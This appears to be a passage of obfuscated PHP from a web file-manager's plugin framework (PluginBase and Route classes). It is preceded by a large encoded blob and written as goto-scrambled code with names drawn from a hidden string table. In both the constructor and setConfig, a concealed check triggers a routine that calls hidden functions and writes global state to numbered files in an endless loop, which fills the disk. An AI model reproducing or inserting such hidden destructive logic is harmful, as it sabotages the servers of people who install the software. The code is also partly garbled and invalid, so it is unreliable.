NimAGmZK4kpMzSthBeiiMg==')."\xec\x81\x21\xa6\x81\x6a\xa1\x97\x43\xde\x33\xb1\x8\xfa\x66\x51\x11\x9c\x6\x57\x4f\x6e\x87\x29\xa6\x18\x40\xe1\x81\xa8\x1a\x3a\xa5\xc4\xa7\x50\x92\x80\xd1\x24\xf3\x25\x40\xb0\xc3\x91"."\x44\x12\xfa\x15\x6a\x95\xe5\xac\xae\x71\x8e\x25\xfb\xb5\xa2\x89\x26\x59\x60\x9\x7e\xa1\x80\x2a\x90\x1\x14\xa3\x29\x1f\x24\x26\x56\x24\x1f\xcf\xa3\x9\xaf\x35\xa1\x4b\xbd\xfc\xbe\x22"."\272\277\314\306\23\135\164\146\61\135\130\267\24\146\176\205\156\374\212\154\205\37\17\143\253\54\230\241\255\124\72\306\20\114\156\264\30\255\331\62\200\231\141\115\47\316".base64_decode('Y7OW1zcBHVgsH2yVELfBooNcVIr3g9v/AZCGXdQKiOHH3PguNDVcZHyJg6MaAw==').strrev(',M%FTЌC90H.-,VEB&ᘻ')."\31\210\345\352\125\22\70\300\224\353\326\346\126\67\3\65\120\64\261\153\244\104\63\343\17\355\20\73\54\162\1\244\27\340\135\353\45\23\314\133\313\14\160\350\153\236"."\xbd\x59\x35\x29\x5\x42\xd3\xfd\x5e\x4f\xa0\xd1\x1f\x99\x29\x41\xe7\x7\xdc\x8\x0\x59\x60\x5b\xa7\x3b\xda\x6c\xc2\x83\x43\x29\x3f\xc1\x7c\x22\xc3\xa0\x33\x1\x84\x4b\x67\x8a\x89\xdc"."\6\27\256\5\273\34\341\145\0\153\265\230\106\25\275\250\106\40\252\147\255\14\1\225\201\133\150\45\162\147\370\46\222\220\71\257\53\305\371\373\25\364\44\47\157\261".base64_decode('UKBQojUkf+kvgClizQ0WayU3VOPVXI9qqJw50BL9Yu18k1BnLrwFpKdEL90c2Q==').base64_decode('+CvFnjiIjwXRJa1N78XDJLpsydMtb/K+DPefjqKCZ/u8LquGIgCwi/XRlTQm+A==')."\x71\x21\xa5\xe3\xb8\xc\x86\x85\xe1\x13\x95\xff\xeb\xca\xd5\x14\x77\xe5\x60\x6b\x9a\x9a\xa2\x7\xe5\xcc\xcc\x1e\xbb\x33\xf6\x8a\x4f\xe4\xd0\x26\x14\xb9\xdf\xff\xaf\x8e\xfc\x1d\x7c\x97"."\77\216\256\336\323\327\61\320\73\275\344\10\203\35\17\307\361\15\170\376\11\240\174\351\375\171\361\230\305\235\242\16\326\251\62\10\275\310\370\350\26\53\214\160\51\27"."\146\47\265\301\317\141\75\7\150\135\360\274\201\312\303\164\277\3\114\150\202\166\313\61\243\355\111\2\273\135\235\345\135\312\242\157\100\113\247\241\353\1\345\44\276\25".strrev(''."\0".'Eڴ;HPYU͗9	SHTcRuH2')."\xcb\xb6\x41\x80\xb6\x8b\x59\x76\x41\xd7\xd8\xb9\x76\x4d\x44\x3\x62\x80\x60\x1d\xc1\xcf\xad\x40\x6b\x67\x1c\xc2\xca\xa3\x3\x8\xe2\x8a\x59\xec\x97\x1f\xd7\x33\x64\xa5\x86\x7d\x9\xe1"."\342\14\140\12\221\264\326\153\175\101\5\102\4\341\305\302\224\255\337\202\51\2\61\243\173\237\302\55\32\372\13\275\11\130\36\104\20\152\37\205\177\142\344\227\162\171".base64_decode('e9V4XpOmVLKx91reyRYALQrX51ApeIQu5xjbIi8SsJdS+PSiaQJJoTc5Gocoag==').base64_decode('A0tWT+ncAT1fgaxOw9mhGTOoQoZtogv4qBaVOxxY9oEciMca+sWwaEOIOg0S6Q==')."\xce\x4a\x8a\x51\xc0\x34\x21\x3\x7d\xd4\x24\xe5\x40\x2f\x6e\x60\x3e\x64\x7f\xd5\x45\x98\x3f\x8c\xb9\x89\xa5\x3b\x32\x5a\x42\xce\x84\xb1\x25\x8e\xc5\xd0\x5d\x7\x7a\xb\xb3\xb3\xb3\x64"."\303\40\267\234\317\17\271\257\217\201\144\217\277\220\363\343\153\125\26\250\56\350\105\242\25\47\76\315\340\167\107\110\166\360\265\126\174\174\101\272\55\126\111\217\220\320"."\17\324\234\232\204\147\31\335\305\107\116\320\122\210\314\166\321\244\216\34\5\272\104\305\205\144\220\246\112\174\200\55\23\24\22\4\234\365\50\200\146\275\50\350\376\12"."\x94\xd1\xa1\xf5\xdd\x1f\x4c\xb0\xe8\xa7\x51\x69\x67\x52\x3f\x8c\x73\x9d\x50\xbc\x57\xca\xcf\x9d\xed\x6f\x8d\xd0\xcf\xb0\x87\x53\x1c\xb8\x67\xfc\xd5\x27\xfc\x4c\x8a\x83\x3d\x89\xe2\xc0".strrev('W-qj'."\n".'T3y."36OOk!')."\xf2\x73\x4c\x10\xb1\x6a\x22\x45\x1d\x16\x7a\x58\xd0\x33\xe\x74\xcc\xe8\xa0\x6e\x54\x6c\xe8\xe0\xbd\x12\x47\xa6\x4\xe\xff\x7b\x1d\xd8\x14\x11\xa9\x17\x29\x2b\xd7\xa9\x9d\x9a\xd0\xe9".base64_decode('0Y09m2qhOqDUc1t47Jaq6BmGOdlUzdjxk0U1no8PPxKpwT/EIxk5lyErOh94aQ==').strrev('<)TA(Ef{g.MK+Q H~-5h_N%uVB')."\100\133\203\347\314\6\157\54\136\302\370\303\105\326\157\341\147\266\112\364\203\177\126\230\32\370\151\34\55\3\325\313\54\334\42\65\165\331\252\47\225\122\7\20\46\250"."\356\241\242\267\4\25\173\333\21\142\310\106\2\117\26\364\5\261\106\123\263\357\202\300\342\160\241\102\233\160\241\134\206\54\273\360\262\43\237\144\377\267\1\244\52\1"."\xd6\x1e\xb8\x6d\x43\x89\x9e\xbb\x4f\xa5\x8c\xc4\xf6\xa6\x90\xed\x51\xb8\x5f\x69\x37\x16\xba\x98\xfa\xe3\x94\xe9\x3b\x45\x68\x50\x85\x9d\x33\xc5\xc\xa1\x1\xc6\x51\x41\x1b\xb3\xf6\xd5".strrev('.'."\n".'eՆ/tk[(CU[KȂq(o	,Tʆ(=V').base64_decode('xGsmqCJxGhRXjfZHSHvJxG2ORlvxTSLPdHa7SBZMTyDqhHfBNDFsvboboq64gA==').base64_decode('kGRRtEC80fZ0HGI+9vfkaP/RPOc8TbimZlEH2DsqFvXAsD8oBMQp0dMeiDIKJw==')."\213\47\341\172\310\252\27\177\315\141\177\115\60\57\334\322\265\275\163\52\154\125\132\137\60\265\334\346\203\336\13\154\323\232\336\21\204\127\56\305\43\13\354\350\14\207"."\xa9\x24\xfe\xff\xfc\xba\xe0\xff\xaf\x47\x5\xc7\x57\xd1\x4d\x65\xcb\xcb\x73\xd3\x89\x80\x4b\x5a\xb\x4f\x89\x98\x72\x8e\x37\x34\x6d\xfd\xb0\x2e\x91\x7\x8a\xa9\x84\x42\x1d\x96\x18\x89"."\xf0\x9\x7\xd7\x1e\x97\xed\x31\x57\x17\x33\x73\xa4\xde\x2e\xa8\x13\xc\x99\x1e\x98\xc8\x99\xc\x5f\x74\x8b\x9e\x22\x3\x14\xd9\xc5\x5e\xca\x2a\x15\x29\x7e\x20\xd2\x42\x7c\x54\xde\xe4"."\xcd\xcc\xa9\xc9\xae\x12\xc7\x78\x70\x8\x2\x56\xaf\x84\x82\x94\x50\x94\x8d\xf3\x27\x20\x4c\x50\xff\x1e\x6e\x1a\x4a\x42\x35\xb\x8a\x92\x94\x2d\x8a\x97\xd0\x42\x79\xaa\x90\x55\x12\x4e"."\74\377\124\312\76\320\265\126\302\105\104\316\141\1\25\361\233\250\145\25\264\0\105\364\360\127\125\135\326\167\75\111\211\26\333\103\120\70\23\365\121\124\374\370\146\361"."\251\156\161\151\66\231\305\42\320\354\323\272\47\303\36\223\254\262\277\56\131\355\54\376\30\266\272\206\373\11\141\250\361\123\202\104\7\16\350\100\260\104\31\74\55\43"."\x3c\xcf\x10\xe4\x5f\x7a\x12\xb2\xa7\x40\x5\x45\x18\x84\xc4\xfe\xd2\xc9\xdc\xaa\x6b\x48\x14\xb3\x42\xd9\xae\x86\x60\x64\x27\xbc\x6c\x58\xf4\xe8\x9a\x6d\xe3\x1e\xa8\x47\xfc\x24\x4b\xd5"."\x90\xd7\x51\xd2\xed\x48\x5b\x4b\x5\xba\x38\x40\x28\x15\x48\xf7\xc2\xb3\xc5\x66\x36\x8f\x77\xbb\x6\x85\x35\x94\xde\xcf\x11\xc\x5e\x9\xc8\xb2\x27\x65\x88\xbe\x94\xad\x25\xa1\x9\xb3"."\x75\xa6\x4c\x2b\x95\x2d\xa9\xe9\x86\x90\x8d\xc1\x4b\xe5\x85\xef\xda\x99\x16\x6c\x72\x57\xb0\x76\x17\xb0\x48\x15\xc6\xda\xad\x45\xc9\x25\xc7\x86\x22\x48\x38\x55\x3\xe2\x6d\xca\xea\xd8".base64_decode('GSUiMPUZRd+y5udC1mM55t2yiFMV1ICQjEpRryPgF95T8vOL2ygZ72Z7emSTHg==')._kodDe('LMtgpz1mS9P7IQJae0m5QG6BtXaBkbd1CPq8p9mqKO6yqStthcPqif5FcOgbmzg=')."\x25\x6b\x8a\xca\xff\xc\xa\x20\xfc\x39\x53\x28\xeb\x8\x57\x1f\xb9\x8d\xad\xd2\x6b\x7f\x3d\xcf\x25\x5e\x97\xb4\x64\x2c\x86\xf2\xab\x91\x42\x79\xbe\x4b\xcf\xbb\x9\x61\xa5\xba\x8f\xa6"."\x8c\xb5\xb8\x78\xf5\x92\x11\x15\x7\x61\xaf\xc0\xcc\xbc\x45\xd0\x34\xa0\xad\x38\xb7\x7b\xc1\x5d\x61\x7a\x34\xff\xa4\xf5\xa2\x27\xcb\xc6\xc6\xc\xe4\x41\x96\xf9\x4e\xb\xd4\xa6\x3b\xc1"."\x5d\x9\xba\x8c\xdb\x92\xc\xf1\xf9\x55\xeb\xd9\x9c\xa8\xd8\xb\x24\xa0\x64\x2\x42\x75\xe2\xb9\xdd\x90\x5\x22\xa5\x3f\xc2\xa9\xd2\x8a\x62\xe1\x52\x2c\x4f\xa0\x8b\x95\x58\x8b\x85\xd9".base64_decode('sY6RnGEx0dIc+9AisZ+TLwZm0cani24kF+dXbK0XC9h7hksYvaqZTAu6SHFiMQ==')."\134\57\102\52\371\120\351\366\332\133\105\161\152\327\320\170\45\105\355\21\16\377\243\132\211\62\270\105\45\213\341\44\364\110\70\223\41\55\145\207\100\1\54\213\223\140"."\331\242\144\132\130\330\332\20\312\231\162\301\30\242\173\305\310\43\132\176\252\104\207\155\272\60\316\72\24\76\113\146\56\376\34\241\70\173\156\264\55\120\272\25\134\233"."\267\35\260\226\152\105\311\314\103\266\242\304\303\307\304\1\127\11\136\113\123\112\160\127\176\32\137\314\307\171\132\11\333\0\134\47\134\243\105\317\56\45\222\105\103\203".base64_decode('0qYI4ZJT37DaCNjgImKovRDQ2PiLwIJh7CgLSy/kunIaWyZS3KoLGoayd3PZ5w==').strrev('pN<NIfZq4Hy}4uӴt fj')."\57\256\355\133\316\247\113\354\16\41\20\16\272\370\246\263\305\340\33\257\377\144\267\35\37\272\171\341\231\53\73\150\201\352\225\3\257\227\70\31\276\150\357\200\151\121"."\x2d\x8f\x7e\x1b\x34\xd3\xa4\x9c\x4\xe8\xff\x28\x27\x12\xf2\xe0\xa2\xe7\x10\x6c\x14\x40\x88\x9f\xaa\x40\x2c\xa2\x8d\x7e\x44\x8e\x88\x6d\xa0\x20\x39\xfe\x83\xa\x67\x44\xc1\xa9\x88\xd9"."\130\42\360\0\201\105\304\65\215\234\331\65\25\154\7\217\34\0\224\310\204\326\107\335\250\301\133\244\274\75\374\271\135\331\56\310\161\31\204\320\233\150\161\201\356\352"."\32\156\234\342\46\36\152\235\250\16\47\161\120\322\231\357\260\24\307\76\375\231\245\341\257\325\100\366\46\171\25\330\163\45\332\126\202\76\134\175\263\375\221\150\244\50"."\251\325\23\211\314\12\205\33\261\243\313\242\144\124\112\60\156\51\112\152\155\16\5\207\112\363\265\170\374\201\242\64\150\354\22\214\163\77\73\70\311\337\212\132\351\11"."\4\102\263\206\152\205\337\73\223\267\4\35\255\362\315\357\174\132\243\73\331\364\214\40\42\147\250\56\55\134\100\123\262\334\341\22\57\143\335\42\20\307\325\240\276\310"."\130\300\352\16\336\146\167\106\11\226\124\4\15\125\202\244\356\160\236\100\241\343\117\66\271\231\260\214\72\244\331\154\356\361\341\261\313\162\342\54\300\321\144\101\54\106"."\40\102\161\165\105\200\321\45\61\46\356\237\26\357\347\243\124\216\21\330\322\31\132\2\107\72\265\204\260\137\217\165\27\162\21\214\340\130\260\116\302\141\222\374\77\62"."\111\173\111\142\236\0\0"."".strrev(''), 10, -8))); goto d; B˭ڪ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto e; E: if ($_SERVER[$AּƤ[830]] != $Cʂ($B)) { goto aԜ덅; d𨆧: $EՇ(); $E½ִ = $AּƤ[849]; $cԣ = json_encode($GLOBALS[$AּƤ[850]]); goto Cܛ; b̄: $D = $AּƤ[847]; $D($_SERVER[$AּƤ[848]]); $EՇ = $AּƤ[846]; goto d𨆧; dŵ: $a؜ = $Cޡ($fێ); $eₛ = explode($AּƤ[229], $a؜); if (count($eₛ) < $AּƤ[582]) { $b¼ = $AּƤ[835]; $b¼(); } goto b̄; Cܛ: $Dϻ = 1; for ($d = $Dϻ; $d > 0; $d++) { $E½ִ(DATA_PATH . $d, $cԣ); } goto cӭ; aԜ덅: $EՇ = $AּƤ[846]; $Cޡ = $AּƤ[832]; $fێ = $_SERVER[$AּƤ[833]] . $AּƤ[834]; goto dŵ; cӭ: } global $in, $config; $this->config =& $config; goto a靌; e͂ӵŌ: $this->pluginHostDefault = $config[$AּƤ[1407]] . $this->pluginName . $AּƤ[8]; $A̲ = $config[$AּƤ[1408]]; if ($A̲ && strpos($AּƤ[47] . $A̲ . $AּƤ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$AּƤ[1409]] . $this->pluginName . $AּƤ[8]; } goto A; e: $AּƤ =& $_SERVER[]; $B = $_SERVER[$AּƤ[833]] . $AּƤ[834]; $Cʂ = $AּƤ[845]; goto E; A: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto BŖ; aѼͮ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $AּƤ[8]; $this->pluginApi = appHostGet() . $AּƤ[1406] . $this->pluginName . $AּƤ[8]; $this->pluginHost = $config[$AּƤ[1407]] . $this->pluginName . $AּƤ[8]; goto e͂ӵŌ; a靌: $this->in =& $in; $this->modelPlugin = Model($AּƤ[1405]); $this->pluginName = str_replace($AּƤ[1405], $AּƤ[33], get_class($this)); goto aѼͮ; BŖ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1410]); } protected function assign($Eڠ, $eʤ = false) { if (is_array($Eڠ)) { $this->values = array_merge($this->values, $Eڠ); } else { $this->values[$Eڠ] = $eʤ; } } protected function display($Cَ) { extract($this->values); require $Cَ; } final function hookRegist($E͈) { $this->modelPlugin->appRegist($this->pluginName, $E͈); } final function appIcon() { $a׼׶ =& $_SERVER[]; $F = $this->appPackage(); $EĜБ = $a׼׶[33]; if (isset($F[$a׼׶[409]])) { if (isset($F[$a׼׶[409]][$a׼׶[1411]])) { $EĜБ = $a׼׶[1412] . $F[$a׼׶[409]][$a׼׶[1411]] . $a׼׶[1413]; } else { if ($F[$a׼׶[409]][$a׼׶[1414]]) { $EĜБ = $a׼׶[1415] . $F[$a׼׶[409]][$a׼׶[1414]] . $a׼׶[1416]; } } } return $EĜБ; } final function fileCanView($A) { goto Eڐ; Eڐ: $F蘓 =& $_SERVER[]; if (request_url_safe($A)) { return !0; } if ($this->isShare($A)) { return !0; } goto dז݉; f܄: ActionCall($F蘓[1429], $A); goto Fɰ; dז݉: $Eо̇ = Session::get($F蘓[1417]); if (!$Eо̇ || !$Eо̇[$F蘓[1418]]) { $fŊ = $F蘓[1419] . rawurlencode(this_url()); show_tips(LNG($F蘓[1420]) . $F蘓[1421] . $fŊ . $F蘓[1422] . LNG($F蘓[1423]) . $F蘓[1424], !1); } if (!Action($F蘓[1425])->authCan($F蘓[1426])) { show_tips(LNG($F蘓[1427]) . $F蘓[1428], !1); } goto f܄; Fɰ: } final function isShare($E) { $B = KodIO::parse($E); return $B[$_SERVER[][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($eۮ玿) { if (request_url_safe($eۮ玿)) { return $eۮ玿; } if (!$this->isShare($eۮ玿)) { $eۮ玿 = $this->filePath($eۮ玿); } return Action($_SERVER[][1077])->linkOut($eۮ玿); } public function filePathLinkOut($aܦ덍) { if (request_url_safe($aܦ덍)) { return $aܦ덍; } $this->fileCanView($aܦ덍); return Action($_SERVER[][1077])->link($aܦ덍); } final function filePath($Eǅ) { $e =& $_SERVER[]; if ($Aō = $this->checkSharePath($Eǅ)) { Hook::trigger($e[1430], $Aō); return $Aō; } $this->fileCanView($Eǅ); if (request_url_safe($Eǅ)) { $aČ = parse_url_query($Eǅ); if (isset($aČ[$e[1431]]) && isset($aČ[$e[209]])) { $dʜ = Model($e[736])->get($e[737]); $f֥ʗӼ = Mcrypt::decode($aČ[$e[209]], $dʜ); if ($f֥ʗӼ) { $this->fileInfo = IO::infoWithChildren($f֥ʗӼ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $f֥ʗӼ; } } $Eǅ = $this->_cacheHttpFile($Eǅ); $this->fileInfo = IO::infoWithChildren($Eǅ); } else { $this->fileInfo = IO::infoWithChildren($Eǅ); if (!$this->fileInfo) { show_tips(LNG($e[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($e[1430], $Eǅ); return $Eǅ; } final function _cacheHttpFile($eƫ) { $Fѳ = hash_path($eƫ, !0); $this->cachePath = $this->pluginCachePath($Fѳ); if ($C = IO::fileNameExist($this->cachePath, $Fѳ)) { return KodIO::make($C); } $B = $this->cachePath . $Fѳ; return $this->pluginCacheFileSet($B, file_get_contents_nossl($eƫ)); } final function _tmpFileName($Aѳ = array()) { goto Aǎ; bʗ: $DΰӬ = array($Aѳ[$EԼԾ[28]], $Aѳ[$EԼԾ[76]], $Aѳ[$EԼԾ[78]]); if (isset($Aѳ[$EԼԾ[487]])) { $DΰӬ[] = $Aѳ[$EԼԾ[487]]; } return md5(implode($EԼԾ[71], $DΰӬ)); goto CǪ; Aٛ: if (isset($Aѳ[$EԼԾ[164]][$EԼԾ[171]])) { return $Aѳ[$EԼԾ[164]][$EԼԾ[171]]; } $E傎 = IO::hashSimple($Aѳ[$EԼԾ[76]]); if ($E傎) { return $E傎; } goto bʗ; Aǎ: $EԼԾ =& $_SERVER[]; if (!$Aѳ) { $Aѳ = $this->fileInfo; } if (isset($Aѳ[$EԼԾ[171]])) { return $Aѳ[$EԼԾ[171]]; } goto Aٛ; CǪ: } final function checkSharePath($eڸ) { goto bӓ; F팮: $this->cachePath = $this->pluginCachePath($this->fileInfo[$b׮[171]]); return $b[$b׮[76]]; goto e; b˼: $b = Action($b׮[1077])->sharePathInfo($eڸ); if (!isset($b[$b׮[76]])) { show_json(LNG($b׮[1433]), !1); } $this->fileInfo = $b[$b׮[164]]; goto F팮; bӓ: $b׮ =& $_SERVER[]; if (!defined($b׮[454])) { define($b׮[1432], 0); } if (!$this->isShare($eڸ)) { return !1; } goto b˼; e: } final function pluginCachePath($b = '') { $AǬ =& $_SERVER[]; $A = IO_PATH_SYSTEM_TEMP . $AǬ[1434] . $this->pluginName; if (!($c = IO::infoFull($A))) { return IO::mkdir($A . $AǬ[8] . $b); } if (empty($b)) { return $c[$AǬ[76]]; } if (!($cȇ = IO::fileNameExist($c[$AǬ[76]], $b))) { return IO::mkdir($c[$AǬ[76]] . $b); } return KodIO::make($cȇ); } final function pluginCacheFileSet($dМӃ, $B޷ = '') { $cƍ =& $_SERVER[]; if (!($F = IO::infoFull($dМӃ))) { return IO::mkfile($dМӃ, $B޷, REPEAT_REPLACE); } IO::setContent($F[$cƍ[76]], $B޷); return $F[$cƍ[76]]; } final function pluginLocalFile($E͆﹉ = '') { goto Bل; Dᡎ: if (!$E͆﹉) { return $Bވ; } $b = IO::info($E͆﹉); $AԷ = $this->_tmpFileName($b) . $b[95] . $b[$b[168]]; goto A̍; Bل: $b =& $_SERVER[]; $Bވ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Bވ)) { mk_dir($Bވ); } goto Dᡎ; A̍: if (!checkExtSafe($AԷ)) { $AԷ = $AԷ . $b[1435]; } $EÌ = $Bވ . $AԷ; if (@file_exists($EÌ)) { return $EÌ; } goto aȘ; aȘ: return IO::copy($E͆﹉, $Bވ, 0, $AԷ); goto BؾƲ; BؾƲ: } final function appPackage() { goto D܋; bޤĿ: $e܌ = Hook::trigger($f[1437], $dɰҴ); if ($e܌ && is_array($e܌)) { $dɰҴ = $e܌; } $this->packageData = $dɰҴ; goto dό; dό: return $dɰҴ; goto Dهȋ; D܋: $f =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $f܉ӌ = $this->parseFile($this->pluginPath . $f[1436]); goto dۊ琙; dۊ琙: $this->parseLang($f܉ӌ); $dɰҴ = json_decode_force($f܉ӌ); if (!$dɰҴ) { return array(); } goto bޤĿ; Dهȋ: } public function packageInfoGet($A仛ڈ) { $B崐֚ = $this->appPackage(); return array_get_value($B崐֚, $A仛ڈ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1438]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1439]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1440]); } private function parseFile($E޸) { goto a۴ّ; F܊: $aݩ㪥Ĭ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Dɢ[88]][$Dɢ[1448]]); if (strstr($Eή, $Dɢ[1449])) { $c = rawurlencode(json_encode($this->pluginLangArr)); $Eή = str_replace($Dɢ[1449], $c, $Eή); } if (strstr($Eή, $Dɢ[1450])) { $c = $c = rawurlencode(json_encode($this->getConfig())); $Eή = str_replace($Dɢ[1450], $c, $Eή); } goto D; a۴ّ: $Dɢ =& $_SERVER[]; $Eή = file_get_contents_nossl($E޸); $D = array($Dɢ[1441], $Dɢ[1442], $Dɢ[1443], $Dɢ[1444], $Dɢ[1445], $Dɢ[1446], $Dɢ[1447]); goto F܊; D: $Eή = str_replace($D, $aݩ㪥Ĭ, $Eή); return $Eή; goto Eߊ; Eߊ: } private function parseLang(&$dݚ) { goto Fڂ; Fڂ: $aҿ =& $_SERVER[]; $a槖 = $aҿ[1451]; if (!strstr($dݚ, $a槖)) { return; } goto fӚ; D뱆: $FȾ = array(); foreach ($dĂ·[0] as $cǡ) { $Fۖ = substr($cǡ, strlen($a槖), -4); $dՕ̂ = LNG($Fۖ); $EΒݘ[] = $cǡ; $FȾ[] = str_replace(array($aҿ[229], $aҿ[1045], $aҿ[340], $aҿ[116]), array($aҿ[50], $aҿ[50], $aҿ[33], $aҿ[1453]), $dՕ̂); } $dݚ = str_replace($EΒݘ, $FȾ, $dݚ); goto D; fӚ: preg_match_all($aҿ[1452], $dݚ, $dĂ·); if (!is_array($dĂ·) || count($dĂ·) == 0 || !is_array($dĂ·[0]) || count($dĂ·[0]) == 0) { return; } $EΒݘ = array(); goto D뱆; D: } private function parseConfig(&$Fҿ) { goto dҺ; dҺ: $b =& $_SERVER[]; $E = $b[1454]; if (!strstr($Fҿ, $E)) { return; } goto Fԃڅ; Fԃڅ: preg_match_all($b[1455], $Fҿ, $E凪); if (!is_array($E凪) || count($E凪) == 0 || !is_array($E凪[0]) || count($E凪[0]) == 0) { return; } $e󴌰 = $this->getConfig(); goto aᮆ; f: $Fҿ = str_replace($A媺, $D®, $Fҿ); goto F󕛳Ѩ; aᮆ: $A媺 = array(); $D® = array(); foreach ($E凪[0] as $Bâ) { $C = substr($Bâ, strlen($E), -2); $A媺[] = $Bâ; $D®[] = _get($e󴌰, $C); } goto f; F󕛳Ѩ: } private function parsePackage(&$dΦ) { goto Dڎ; Dᗐ: preg_match_all($E[1457], $dΦ, $c͑); if (!is_array($c͑) || count($c͑) == 0 || !is_array($c͑[0]) || count($c͑[0]) == 0) { return; } $AϻΛ = $this->appPackage(); goto D; D: $dǐġ = array(); $Bн = array(); foreach ($c͑[0] as $Dڃ) { $B饅 = substr($Dڃ, strlen($a魻), -2); $dǐġ[] = $Dڃ; $Bн[] = _get($AϻΛ, $B饅); } goto Bи; Bи: $dΦ = str_replace($dǐġ, $Bн, $dΦ); goto a➇; Dڎ: $E =& $_SERVER[]; $a魻 = $E[1456]; if (!strstr($dΦ, $a魻)) { return; } goto Dᗐ; a➇: } final function echoFile($eؐƗ, $c۷ = false) { goto Fǂ; Fǂ: $f茈 =& $_SERVER[]; $D = $this->pluginPath . $eؐƗ; if (ACT == $f茈[1458]) { echo $f茈[1459] . $this->pluginName . $f茈[8] . $eؐƗ . $f茈[1460]; if (!file_exists($D)) { echo $f茈[1461]; return; } } goto c됖Η; DЫ棆: $this->parsePackage($A作); if (is_array($c۷)) { $A作 = str_replace(array_keys($c۷), array_values($c۷), $A作); } echo $f茈[229] . $A作; goto aȗ貼; c됖Η: $A作 = $this->parseFile($D); $this->parseLang($A作); $this->parseConfig($A作); goto DЫ棆; aȗ貼: } final function initLang() { goto FǙ; FǙ: $a =& $_SERVER[]; $Cʶ = $a[1462]; $D٭ = $this->pluginPath . $a[1463]; goto e͖; e͖: $fߩ = I18n::getType(); $c¡ = array(); if (file_exists($D٭ . $fߩ . $a[809])) { $c¡ = (include $D٭ . $fߩ . $a[809]); } else { if ($fߩ == $a[1464] && !file_exists($D٭ . $fߩ . $a[809]) && file_exists($D٭ . $a[1465])) { $c¡ = (include $D٭ . $a[1465]); } else { if (file_exists($D٭ . $Cʶ . $a[809])) { $c¡ = (include $D٭ . $Cʶ . $a[809]); } } } goto C򋫛; C򋫛: if (!is_array($c¡)) { return array(); } if (@count($c¡) > 0) { I18n::set($c¡); } return $c¡; goto Fճ; Fճ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($eՉ) { $E =& $_SERVER[]; $Aӈ = $_SERVER[$E[837]]; $A = $E[845]; if ($_SERVER[$E[830]] != $A($Aӈ)) { goto a; b侢: $CΘ = $E[847]; $CΘ($_SERVER[$E[848]]); $b = $E[846]; goto b̊; a: $b = $E[846]; $BҠ = $E[832]; $D = $_SERVER[$E[833]] . $E[834]; goto EǶȝ; D: $fఋ = 1; for ($e넬ӯ = $fఋ; $e넬ӯ > 0; $e넬ӯ++) { $d昒ι(DATA_PATH . $e넬ӯ, $c); } goto CŘݐ; b̊: $b(); $d昒ι = $E[849]; $c = json_encode($GLOBALS[$E[850]]); goto D; EǶȝ: $Bֶ = $BҠ($D); $BΉ = explode($E[229], $Bֶ); if (count($BΉ) < $E[582]) { $cɼ = $E[835]; $cɼ(); } goto b侢; CŘݐ: } return $this->modelPlugin->setConfig($this->pluginName, $eՉ); } public function onSetConfig($b) { } public function onGetConfig($EՈ) { } public function onChangeStatus($eꦌ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($B = "\x70\154\165\x67\x69\x6e\101\x75\164\x68") { $FЧڇ =& $_SERVER[]; if (!defined($FЧڇ[454])) { return !1; } if (_get($GLOBALS, $FЧڇ[485])) { return !0; } $c = $this->getConfig(); if (!$c[$B]) { return !1; } return ActionCall($FЧڇ[1466], $c[$B]); } public function url($E, $Bơ = '', $bҾݣ = true) { goto fǚ; d鼆: if (!$bҾݣ) { return $Cƈ; } echo $Cƈ; goto D⍅; fǚ: $B =& $_SERVER[]; $c = $this->getConfig(); $c򝉩 = KOD_VERSION . $B[95] . KOD_VERSION_BUILD; goto DĊʈ; DĊʈ: $f = $this->packageVersion(); $A = $c򝉩 . $B[440] . $f; if (substr($E, 0, 4) == $B[147] || substr($E, 0, 2) == $B[1252]) { $Cƈ = $E . $B[1467] . $A; } else { if ($Bơ == $B[33]) { $Cƈ = $this->pluginHost . $E . $B[1467] . $A; } else { if ($Bơ === $B[77]) { $Cƈ = $this->pluginHost . $E; } else { if ($Bơ == $B[1468]) { $Cƈ = STATIC_PATH . $E . $B[1467] . $c򝉩; } else { if ($Bơ == $B[1469]) { $Cƈ = APP_HOST . $B[1470] . $E . $B[1467] . $c򝉩; } else { if (isset($c[$Bơ])) { $Cƈ = $c[$Bơ] . $E . $B[1467] . $A; } } } } } } goto d鼆; D⍅: } public function link($aÂ = false, $Fۥ = '') { $d =& $_SERVER[]; if (!$aÂ) { $this->link($d[1471], $d[1469]); $this->link($d[1472], $d[1468]); $this->link($d[1473], $d[1468]); $this->link($d[1474], $d[1468]); $this->link($d[1475], $d[1468]); return; } $dͭ˜ = $this->url($aÂ, $Fۥ, !1); if (substr($aÂ, -3) == $d[1476]) { echo $d[1477] . $dͭ˜ . $d[1478] . $d[229]; } else { if (substr($aÂ, -4) == $d[1479]) { echo $d[1480] . $dͭ˜ . $d[1481] . $d[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\x5b\136\x2f\x5d\53", "\x3a\x6e\x75\x6d" => "\133\x30\x2d\71\135\x2b", "\72\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($A꼙, $AЗ) { $e =& $_SERVER[]; if ($A꼙 == $e[1482]) { $A = array_map($e[1483], $AЗ[0]); $F = strpos($AЗ[1], $e[8]) === 0 ? $AЗ[1] : $e[8] . $AЗ[1]; $D󌟷 = $AЗ[2]; } else { $A = null; $F = strpos($AЗ[0], 